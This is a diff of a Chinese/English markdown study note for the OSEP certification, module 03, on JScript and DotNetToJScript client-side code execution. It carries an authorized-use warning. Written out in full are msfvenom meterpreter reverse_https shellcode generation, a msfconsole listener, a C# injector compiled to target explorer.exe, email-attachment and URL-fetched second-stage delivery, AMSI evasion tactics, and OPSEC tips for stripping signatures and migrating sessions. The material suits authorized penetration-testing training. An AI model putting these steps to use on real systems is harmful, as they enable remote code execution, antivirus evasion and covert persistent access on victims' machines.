@@ -1,15 +1,11 @@
-::: warning Authorized use only
-For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
+::: warning 仅限授权使用
+本笔记仅用于 OSEP 官方实验 / 考试环境，或已获得书面授权的测试。禁止对未授权系统使用。
 :::
 
-# Module 03 — JScript / .NET
+# 模块 M03：JScript / DotNetToJScript 客户端代码执行
 
-WSH is not a .NET process. Bridge with DotNetToJScript. Match host bitness.
-
-Switch to **中文** in the header for the original full narrative. Lab listings on this page are complete.
-
-> Covers scenarios：9–10
-> > Prerequisites：目标保留 Windows Script Host（`cscript` / `wscript`）；目标装有 .NET Framework（2.0/3.5 或 4.x）；attacker box有 `msfvenom`、HTTP 服务与 MSF 监听；一台能运行 .NET 的工具机用于生成 DotNetToJScript / SuperSharpShooter 产物（Windows 或 Linux + mono/python）
+> 覆盖场景：9–10
+> > 前置依赖：目标保留 Windows Script Host（`cscript` / `wscript`）；目标装有 .NET Framework（2.0/3.5 或 4.x）；攻击机有 `msfvenom`、HTTP 服务与 MSF 监听；一台能运行 .NET 的工具机用于生成 DotNetToJScript / SuperSharpShooter 产物（Windows 或 Linux + mono/python）
 
 ## 背景速览：WSH 为什么能绕开"EXE 受限"
 
@@ -23,22 +19,22 @@ Switch to **中文** in the header for the original full narrative. Lab listings
 
 ---
 
-## Scenario 9：邮件附件中的 JScript 会运行，但普通 EXE 受到限制
+## 场景 9：邮件附件中的 JScript 会运行，但普通 EXE 受到限制
 
-**Situation**：脚本入口可用，直接跑独立 EXE 不行 → 用 JScript 桥接 + C# 第二阶段，把执行放进 WSH/.NET 进程内，避免 EXE 落地与直接启动。
+**场景回顾**：脚本入口可用，直接跑独立 EXE 不行 → 用 JScript 桥接 + C# 第二阶段，把执行放进 WSH/.NET 进程内，避免 EXE 落地与直接启动。
 
-**Assumptions**：
+**前提与假设**：
 - 用户会打开附件里的 `.js`（或从 URL 打开），WSH 可用；`cscript/wscript` 未被 AppLocker 禁用（脚本规则默认放行，需先用场景 18–24 的枚举确认）。
 - 目标装有 .NET Framework 4.x（默认 v4 路线成立）。
 - 我方已有：`msfvenom`、MSF 监听、HTTP 托管；一台工具机运行 DotNetToJScript/SuperSharpShooter 生成产物。
 - 我方知道目标进程位数（邮件双击 → x64 宿主；用 32 位宿主需把载荷压到 SysWOW64 路径或用 `cscript //E:jscript` 指定）。
 
-**Prepare (attacker)**：
+**准备（攻击机侧）**：
 1. 生成 shellcode（x64，注入 64 位进程用）：
    ```bash
    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT EXITFUNC=thread -f csharp
    ```
-   若目标宿主是 32 位（x86 target，或必须走 SysWOW64 宿主），改用 `windows/meterpreter/reverse_https`（x86）。
+   若目标宿主是 32 位（x86 目标机，或必须走 SysWOW64 宿主），改用 `windows/meterpreter/reverse_https`（x86）。
 2. 把第 1 步输出粘进 `m03-dotnettojscript-payload.cs` 的 `PAYLOAD` 字节数组，在工具机编译：
    ```bat
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /platform:anycpu /out:payload.dll m03-dotnettojscript-payload.cs
@@ -58,9 +54,9 @@ Switch to **中文** in the header for the original full narrative. Lab listings
    sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost LHOST; set lport LPORT; exploit"
    python3 -m http.server 80
    ```
-5. 在**本机/实验靶机**先用 `cscript //nologo runner.js` Verify一次回连（见"Verify"），成功后再投递。
+5. 在**本机/实验靶机**先用 `cscript //nologo runner.js` 验证一次回连（见"验证"），成功后再投递。
 
-**Procedure**：
+**执行步骤**：
 1. 确认目标脚本入口与宿主位数（可用 `m03-wsh-amsi-probe.js` 的宿主信息段）：
    ```bat
    cscript //nologo probe.js        :: 打印 HOST_ARCH / PROCESSOR_ARCHITECTURE
@@ -73,7 +69,7 @@ Switch to **中文** in the header for the original full narrative. Lab listings
 4. 监听端收到 `windows/x64/meterpreter` 会话，进入第二阶段（迁移到稳定进程后继续后续枚举）。
 5. 若脚本入口是"下载后执行"而目标**能**跑脚本但不能跑 EXE：`m03-simple-dropper.js` 负责把第二阶段**脚本/数据文件**拉到目标（`RUN_AFTER_DOWNLOAD=0`），再用受信任宿主执行；不要让它直接 `Run(pay.exe)`。
 
-**Lab files**：
+**用到的脚本**：
 | 脚本 | 用途 | 关键参数 |
 |---|---|---|
 | `m03-dotnettojscript-payload.cs` | C# 第二阶段（[ComVisible] 类，构造时注入 shellcode） | `PAYLOAD`（msfvenom csharp 字节）、`TARGET_PROCESS` |
@@ -416,16 +412,16 @@ try {
 WScript.Quit(0);
 ````
 
-**Verify**：监听端出现 meterpreter 会话即成功。本地预Verify时注意——`runner.js` 会在**执行它的那个进程**里激活 .NET：用 `cscript //nologo` 跑且宿主是 64 位，则必须用 x64 shellcode；若注入 `explorer.exe`，先确认该进程存在且位数匹配，否则 `OpenProcess/CreateRemoteThread` 失败且无会话（脚本无回显，需靠监听判断）。
+**验证**：监听端出现 meterpreter 会话即成功。本地预验证时注意——`runner.js` 会在**执行它的那个进程**里激活 .NET：用 `cscript //nologo` 跑且宿主是 64 位，则必须用 x64 shellcode；若注入 `explorer.exe`，先确认该进程存在且位数匹配，否则 `OpenProcess/CreateRemoteThread` 失败且无会话（脚本无回显，需靠监听判断）。
 
-**If it fails**：
+**失败分支与备选**：
 1. 双击后无回连、cscript 运行也无回连 → 先查位数：`PROCESSOR_ARCHITECTURE=AMD64` 但注入目标是 32 位进程（SysWOW64 的 explorer 或 Office 子进程）会静默失败。对策：把注入目标改成与 shellcode 同位数（如 x64 shellcode + 64 位 `explorer.exe`），或 payload 编译为 AnyCPU 并让 shellcode 位数跟随注入目标。
 2. `.NET 3.5/v2` 产物在 Win10 报"未启用" → 换 `--ver=v4` 重生成；反之若目标是老系统只有 2.0，则 v4 产物无法加载，需 v2 产物。
 3. `runner.js` 一运行就被杀软终止 → 属场景 10 范畴：先 `m03-wsh-amsi-probe.js` 探宿主，再换 SuperSharpShooter 带 AMSI 选项的产物、或换第二阶段的执行方式（见场景 10 失败分支）。
 4. 工具机不在手上、没有 DotNetToJScript.exe → 直接用 SuperSharpShooter 路线（步骤 3 备选），产物同为单文件 `payload.js`。
 5. 目标拒绝"附件脚本"但允许"点击 URL" → 用 `mshta http://URL/payload.hta`（见 M02）包裹同一份 JScript 内容。
 
-**Exam notes / OPSEC**：
+**考试注意 / OPSEC**：
 - **位数三处必须一致**：宿主进程位数 ↔ 程序集平台 ↔ 注入目标位数。先 `wmic os get osarchitecture` / `echo %PROCESSOR_ARCHITECTURE%` 再选 payload。
 - 预生成产物含工具默认字符串（`TestClass`、工程 GUID 等），会留特征；投递前全局替换为中性名并保持长度一致。
 - DotNetToJScript 产物跑在 `wscript` 进程内，会话父进程是 `wscript.exe`——上线后立即 `migrate` 到 `explorer/svchost` 类进程，避免用户关窗口断会话。
@@ -434,16 +430,16 @@ WScript.Quit(0);
 
 ---
 
-## Scenario 10：JScript 能执行简单内容，但复杂脚本被扫描拦截
+## 场景 10：JScript 能执行简单内容，但复杂脚本被扫描拦截
 
-**Situation**：同一脚本入口里，简单 dropper 能跑；一旦加入 .NET 桥接/较复杂的第二阶段内容就被拦。PowerShell 里Verify过的 AMSI 绕过**不能直接搬到 WSH**——因为 PS 的绕过靠 PS runspace 内反射，而 WSH 是非托管宿主，先把宿主差异讲清楚再动手。
+**场景回顾**：同一脚本入口里，简单 dropper 能跑；一旦加入 .NET 桥接/较复杂的第二阶段内容就被拦。PowerShell 里验证过的 AMSI 绕过**不能直接搬到 WSH**——因为 PS 的绕过靠 PS runspace 内反射，而 WSH 是非托管宿主，先把宿主差异讲清楚再动手。
 
-**Assumptions**：
+**前提与假设**：
 - 已确认是"内容被扫描拦截"而非入口被封（简单脚本同入口可跑即可排除入口问题；参场景 8 的"先别假定是杀软"思路，先做时序/分段实验）。
 - 目标 Windows 10+ 且 AMSI 对脚本引擎生效（默认 Defender 场景）；拦截点可能是文件内容解析，也可能是 `eval`/动态执行内容。
 - 我方有实验靶机可复现"简单能跑、复杂被拦"，用于二分定位到底哪一段内容触发。
 
-**Prepare (attacker)**：
+**准备（攻击机侧）**：
 1. 准备实验脚本 `m03-wsh-amsi-probe.js`，先在本机与靶机各跑一遍，记录宿主位数、.NET 目录、动态执行段的 PASS/BLOCKED 结果：
    ```bat
    cscript //nologo m03-wsh-amsi-probe.js
@@ -453,7 +449,7 @@ WScript.Quit(0);
    - 阶段 B（第二阶段）：DotNetToJScript 产物或 SuperSharpShooter 产物，放到目标本地再由 A 拉取执行；或作为独立二次附件。
 3. 若仍需"复杂内容"，用 SuperSharpShooter 的 AMSI 相关选项重新生成产物（见其 README 的 evasion 参数），不要手写 PS 风格绕过。
 
-**Procedure**：
+**执行步骤**：
 1. 定位拦截点：写两个最小变体对比——变体 1 只做 `WScript.Echo`/下载；变体 2 在变体 1 基础上仅追加"加载 .NET 桥接"的调用。若 1 通 2 挂，则拦截点在桥接内容而非 dropper 本身。
 2. 分离第二阶段：附件只放阶段 A（`m03-simple-dropper.js` 的下载逻辑，`RUN_AFTER_DOWNLOAD=0`），把 `payload.js`（SuperSharpShooter 产物）托管在 `http://URL/payload.js`：
    ```js
@@ -464,7 +460,7 @@ WScript.Quit(0);
 4. 若阶段 B 仍被拦，改用 `m03-supersharpshooter-loader.js` 的加载形态：它读取同目录 `payload.js` 后执行，便于在靶机上快速试不同产物而不用反复改附件。
 5. 兜底：回到场景 9 的 HTA/mshta 宿主换一个扫描上下文（`mshta` 的 JScript 由 mshtml 引擎处理，AMSI 集成点与 cscript 不同；注意这属于"换宿主绕过"，要记下哪条线在目标上成立，考试里直接走成立的那条）。
 
-**Lab files**：
+**用到的脚本**：
 | 脚本 | 用途 | 关键参数 |
 |---|---|---|
 | `m03-wsh-amsi-probe.js` | 报告宿主信息 + 对动态执行内容做 PASS/BLOCKED 实验 | 无参数；`EVAL_TEST_CONTENT` 可改 |
@@ -472,16 +468,16 @@ WScript.Quit(0);
 | `m03-supersharpshooter-loader.js` | 分离式第二阶段加载实验 | `STAGE2_JS` |
 | `m03-dotnettojscript-loader.js`、`m03-dotnettojscript-payload.cs` | 桥接产物容器与 C# 第二阶段 | 见场景 9 |
 
-**Verify**：探针脚本里"已知特征串"实验段被 BLOCKED、而普通字符串 PASS，说明该宿主确实接了 AMSI 扫描，后续按"内容越不透明越好"设计；最终以监听端会话为成功标准。注意探针本身可能被杀软弹窗/拦截，属预期（探针目的就是暴露拦截）。
+**验证**：探针脚本里"已知特征串"实验段被 BLOCKED、而普通字符串 PASS，说明该宿主确实接了 AMSI 扫描，后续按"内容越不透明越好"设计；最终以监听端会话为成功标准。注意探针本身可能被杀软弹窗/拦截，属预期（探针目的就是暴露拦截）。
 
-**If it fails**：
+**失败分支与备选**：
 1. 加桥接就挂、纯下载就通 → 桥接内容是被扫描的目标。对策：A/B 分离 + 换新进程执行（步骤 2）；把桥接产物换成 SuperSharpShooter 带 AMSI 选项的生成结果。
 2. 连阶段 A 的下载目标域名/IP 都被拦 → 不是 AMSI 内容问题而是网络层（URL 信誉/代理）；换 HTTPS + 正常 UA/证书（场景 31），或走场景 9 的邮件附件直接给完整产物。
 3. `eval` 动态拼出的内容被拦（探针里 eval 段 BLOCKED）→ 设计上**避免在 WSH 里 eval 攻击文本**：第二阶段一律走序列化/二进制形态或独立进程，脚本正文保持静态无害。
 4. PS 里可用的 AMSI bypass 代码搬进 JScript 报错/无效 → 不要移植：WSH 无法像 PS 那样在同 runspace 里 `Add-Type` 反射 patch；要么用带 AMSI 处理的现成生成器（SuperSharpShooter 选项），要么换宿主（mshta/Office，见 M01/M02），不要现场手搓内存 patch。
 5. 反复被拦且无法定位 → 用探针二分（只加一段、只加另一段），确认是"内容签名"还是"行为（网络/进程）"再决定对策，避免无谓换壳。
 
-**Exam notes / OPSEC**：
+**考试注意 / OPSEC**：
 - 场景 8 的教训同样适用：**先确认是拦截而不是时序/生命周期问题**——分离下载执行后先看文件是否落地、进程是否起来，再断定"被杀"。
 - 探针脚本会在目标上做"尝试恶意内容"的动作，日志可能留特征；实验时用一次性文件名，别把探针当最终载荷反复投。
 - AMSI 拦截的是**动态内容**，不是文件名/图标——别在伪装文件名上浪费时间，把精力放在"正文不透明、分段、换宿主"。
@@ -504,7 +500,7 @@ sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/re
 python3 -m http.server 80
 
 # 目标侧
-cscript //nologo runner.js                # 本地预Verify/无窗口回显跑
+cscript //nologo runner.js                # 本地预验证/无窗口回显跑
 echo %PROCESSOR_ARCHITECTURE%            # 先确认位数再定 shellcode
 cscript //nologo m03-wsh-amsi-probe.js   # 场景 10：宿主信息 + AMSI 实验
 ```
